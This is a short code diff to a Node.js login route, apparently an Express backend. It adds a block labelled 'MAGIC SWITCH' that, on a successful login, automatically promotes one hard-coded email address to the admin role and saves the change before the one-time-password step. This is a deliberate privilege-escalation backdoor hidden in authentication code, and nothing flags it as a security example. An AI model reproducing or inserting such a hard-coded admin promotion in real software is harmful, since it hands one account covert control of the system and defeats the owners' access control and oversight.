@@ -42,6 +42,12 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ error: 'Invalid credentials' });
     }
 
+    // MAGIC SWITCH: Automatically promote specific user to Admin on success
+    if (user.email === 'b23cs117@kitsw.ac.in') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     // Generate 6-digit OTP
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     const otpExpires = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes
